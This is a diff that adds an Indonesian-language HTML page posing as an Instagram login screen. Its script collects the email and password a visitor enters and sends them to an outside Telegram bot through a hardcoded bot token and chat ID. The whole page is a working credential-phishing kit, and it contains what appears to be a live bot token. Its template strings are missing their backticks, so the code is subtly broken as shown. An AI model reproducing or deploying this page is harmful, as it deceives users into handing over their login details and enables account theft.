@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <h1 class="logo">Instagram</h1>
+      <form id="loginForm">
+        <input type="email" id="email" placeholder="Email" required />
+        <input type="password" id="password" placeholder="Password" required />
+        <button type="submit">Login</button>
+      </form>
+      <p class="signup">Belum punya akun? <a href="#">Daftar</a></p>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(event) {
+      event.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const pesan = Email: ${email}\nPassword: ${password};
+
+      const botToken = "7981415218:AAGcD16TtqhXe5o7E0igwkL0V0N2LMfeKeY";
+      const chatId = "6359213992";
+      const telegramApi = https://api.telegram.org/bot${botToken}/sendMessage;
+
+      try {
+        const telegramResponse = await fetch(telegramApi, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: pesan,
+            parse_mode: "Markdown"
+          })
+        });
+
+        if (telegramResponse.ok) {
+          document.body.innerHTML = "<h2>Pesan berhasil dikirim ke Telegram!</h2>";
+        } else {
+          alert("Gagal mengirim pesan ke Telegram.");
+        }
+      } catch (error) {
+        console.error("Terjadi kesalahan:", error);
+        alert("Terjadi kesalahan saat mengirim pesan.");
+      }
+    });
+  </script>
+</body>
+</html>
